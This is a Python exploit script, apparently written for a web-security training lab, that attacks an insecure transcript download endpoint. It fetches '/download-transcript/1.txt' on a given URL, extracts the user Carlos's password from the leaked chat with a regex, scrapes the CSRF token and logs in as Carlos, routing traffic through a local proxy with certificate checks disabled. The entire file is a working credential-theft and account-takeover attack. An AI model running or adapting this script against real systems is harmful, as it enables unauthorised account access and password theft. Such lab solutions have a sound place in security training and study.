import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def retrive_carlos_password(s, url):
    chat_url = url + "/download-transcript/1.txt"
    r = s.get(chat_url, verify=False, proxies=proxies)
    res = r.text
    if 'password' in res:
        print("(+) Found Carlos's password...")
        carlos_password = re.findall(r'password is (.*)\.', res)
        return carlos_password[0]
    else:
        print("(-) Could not find Carlos's password.")
        sys.exit(-1)

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def carlos_login(s, url, password):

    # Get CSRF token from the login page
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    # Login as the carlos user
    print("(+) Logging in as the Carlos user...")
    data_login = {"username": "carlos", "password": password, "csrf": csrf_token}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("(+) Successfully logged in as the carlos user.")
    else:
        print("(-) Could not login as the Carlos user.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    carlos_password = retrive_carlos_password(s, url)

    print("(+) Logging into Carlos's account...")
    carlos_login(s, url, carlos_password)


if __name__ == "__main__":
    main()